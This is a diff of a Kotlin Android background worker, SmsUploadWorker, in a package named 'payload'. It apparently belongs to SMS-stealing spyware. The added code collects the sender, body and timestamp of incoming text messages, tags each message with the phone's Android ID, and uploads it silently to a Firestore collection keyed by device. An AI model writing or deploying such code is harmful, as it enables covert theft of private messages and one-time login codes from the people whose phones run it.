@@ -1,61 +1,75 @@
 package com.payload.jansiix0ne.worker
 
 import android.content.Context
-import android.util.Log
+import android.provider.Settings
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
-import com.payload.jansiix0ne.data.model.SmsModel
-import com.payload.jansiix0ne.data.repository.FirestoreRepository
-import com.payload.jansiix0ne.util.SmsHelper
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.withContext
+import com.google.firebase.Timestamp
+import com.google.firebase.firestore.FirebaseFirestore
+import com.payload.jansiix0ne.models.SmsModel
+import kotlinx.coroutines.tasks.await
 import java.util.Date
+import java.util.UUID
 
-/**
- * Worker that uploads SMS to Firestore
- */
 class SmsUploadWorker(
-    context: Context,
+    appContext: Context,
     params: WorkerParameters
-) : CoroutineWorker(context, params) {
+) : CoroutineWorker(appContext, params) {
 
-    private val firestoreRepository = FirestoreRepository()
+    private val firestore = FirebaseFirestore.getInstance()
 
-    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
-        try {
-            val from = inputData.getString("from") ?: return@withContext Result.failure()
-            val message = inputData.getString("message") ?: return@withContext Result.failure()
-            val timeLong = inputData.getLong("time", -1)
+    override suspend fun doWork(): Result {
+        return try {
+            val from = inputData.getString("from") ?: return Result.failure()
+            val message = inputData.getString("message") ?: return Result.failure()
+            val time = inputData.getLong("time", -1L)
+            if (time == -1L) return Result.failure()
             
-            if (timeLong == -1L) {
-                return@withContext Result.failure()
-            }
+            val deviceId = getDeviceId()
             
-            val deviceId = inputData.getString("deviceId") ?: SmsHelper.getDeviceId(applicationContext)
-            
-            val sms = SmsModel(
+            val smsModel = SmsModel(
                 from = from,
                 message = message,
-                date = Date(timeLong),
+                time = Timestamp(Date(time)),
                 ownerDeviceId = deviceId
             )
             
-            val result = firestoreRepository.storeSms(sms, deviceId)
+            val targetDeviceId = inputData.getString("deviceId") ?: return Result.failure()
             
-            if (result.isSuccess) {
-                Log.d(TAG, "SMS uploaded successfully")
-                Result.success()
-            } else {
-                Log.e(TAG, "Failed to upload SMS: ${result.exceptionOrNull()?.message}")
-                Result.retry()
-            }
+            // Upload to Firestore
+            uploadSmsToFirestore(smsModel, targetDeviceId)
+            
+            Result.success()
         } catch (e: Exception) {
-            Log.e(TAG, "Error in SmsUploadWorker: ${e.message}", e)
             Result.failure()
         }
     }
 
-    companion object {
-        private const val TAG = "SmsUploadWorker"
+    private suspend fun uploadSmsToFirestore(smsModel: SmsModel, deviceId: String) {
+        firestore.collection("devices")
+            .document(deviceId)
+            .collection("sms")
+            .add(smsModel)
+            .await()
+    }
+
+    private fun getDeviceId(): String {
+        val prefs = applicationContext.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
+        var deviceId = prefs.getString("device_id", null)
+        
+        if (deviceId.isNullOrBlank()) {
+            deviceId = Settings.Secure.getString(
+                applicationContext.contentResolver,
+                Settings.Secure.ANDROID_ID
+            )
+            
+            if (deviceId.isNullOrBlank() || deviceId == "unknown") {
+                deviceId = UUID.randomUUID().toString()
+            }
+            
+            prefs.edit().putString("device_id", deviceId).apply()
+        }
+        
+        return deviceId
     }
 }
